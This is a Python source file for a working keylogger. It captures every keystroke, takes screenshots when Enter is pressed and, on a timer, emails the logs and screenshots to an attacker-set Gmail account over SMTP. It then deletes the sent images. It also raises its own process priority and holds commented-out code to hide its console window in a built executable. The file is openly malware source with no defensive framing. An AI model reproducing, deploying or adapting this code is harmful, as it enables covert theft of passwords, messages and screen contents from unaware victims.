import keyboard #Record keystrokes
import smtplib #Send emails
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import pyautogui, random, os
from PIL import ImageGrab
from functools import partial
#pip install pywin32
#python -m pip install pywin32
import win32api,win32process,win32con,win32gui,sys
ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)

SEND_TIMER = 100#Time to wait before sending in seconds
EMAIL = "@gmail.com" #EMail to which keylogs will be sent
PASS = "************" #Set up double auth for your gmail account, and create app password

#---------------------------------------------------
def highpriority():
    """ Set the priority of the process to be high."""
    #Check which OS is running on the computer
    try:
        sys.getwindowsversion()
    except AttributeError:
        isWindows = False
    else:
        isWindows = True
    #Apply properties to Windows OS
    if isWindows:
        pid = win32api.GetCurrentProcessId()
        handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
        win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
        #Hide terminal window 
        #Uncomment for exe build
        #terminal_to_hide = win32gui.GetForegroundWindow()
        #win32gui.ShowWindow(terminal_to_hide , win32con.SW_HIDE)
    else:#Apply properties to Linux and Mac
        os.nice(1)

highpriority()

#-----------------------------------
class Keylogger:
    def __init__(self, interval, report_method="both"):
        self.interval = interval
        self.report_method = report_method
        #String to hold keylogs
        self.log = ""
        #Start and End times
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    #Take screenshots on user's computer
    def takeScreenshot(self):
        nums = "1234567890"
        ss_name = ""
        for i in range(4):
            ss_name += random.choice(nums)
        ss = pyautogui.screenshot()
        ss.save("Screenshots/Screenshot_" + ss_name + ".png")

    #Callback to be invoked when key is released
    def callback(self, event):
        key = event.name #Store keypress
        #Check for special char
        if len(key) > 1:
            if key == "space":
                key = "    "
            elif key == "enter":
                #Skip line
                key = "[ENTER]\n"
                self.takeScreenshot()
            else:
                #Keylog Control, Shift, Backspace, Alt keys
                key = key.replace(" ", "_")
                key = f"[{key.upper()}]"
        self.log += key#Add recorded key to the big log

    #Create name for the file to save recordings to
    def generate_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    #Save keylog file in current directory
    def save_to_file(self):
        with open(f"Keylogs/{self.filename}.txt", "w") as file:
            #Write keylogs into file
            print(self.log, file=file)
        print(f"SAVED {self.filename}.txt")

    #Prepare html template for email
    def prepare_mail(self, recordings):        
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL
        msg["To"] = EMAIL
        msg["Subject"] = f"Keylogs - {datetime.now()}"
        #Message body
        html = f"<p>Keylogger Records - {recordings}</p>"
        text_part = MIMEText(recordings, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        #Attach Screenshots
        ss_path = r'Screenshots'
        for x in os.listdir(ss_path):
            if os.path.isfile(os.path.join(ss_path, x)):
                img_path = os.path.join(ss_path, x)#Path to current image
                with open(img_path, "rb") as image:
                    img = MIMEImage(image.read(), name=os.path.basename("noname.png"))
                img.add_header("Content-ID", "<{}>".format("Screenshot"+x))
                msg.attach(img)
                #Delete sent screenshots
                os.remove(img_path)
        return msg.as_string()

    def sendmail(self, email, password, recordings):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        #Login with email and app password
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(recordings))
        server.quit()
        print(f"{datetime.now()} - Sent an email to {email} containing recordings: {recordings}")

    #Gets called when timer is over, to send recordings and reset self.log
    def report(self):
        #Check if log is not empty
        if self.log:
            self.end_dt = datetime.now()
            self.generate_filename()
            if self.report_method == "both":
                self.sendmail(EMAIL, PASS, self.log)
                self.save_to_file()
            elif self.report_method == "email":
                self.sendmail(EMAIL, PASS, self.log)
            elif self.report_method == "file":
                self.save_to_file()
            print(f"Reported to [{self.filename}] - {self.log}")
            self.start_dt = datetime.now() 
        self.log = "" #Reset recordings log
        timer = Timer(interval=self.interval, function=self.report)
        #Set the thread to be daemon (stops running when main thread stops)
        timer.daemon = True
        timer.start()

    def start(self):
        #Record start date time
        self.start_dt = datetime.now()
        #Start keylogging
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        #Block current thread to stop app from running, CTRl + C to stop
        keyboard.wait()

if __name__ == "__main__":
    #Run keylogger
    keylogger = Keylogger(interval=SEND_TIMER, report_method="both")
    keylogger.start()


     
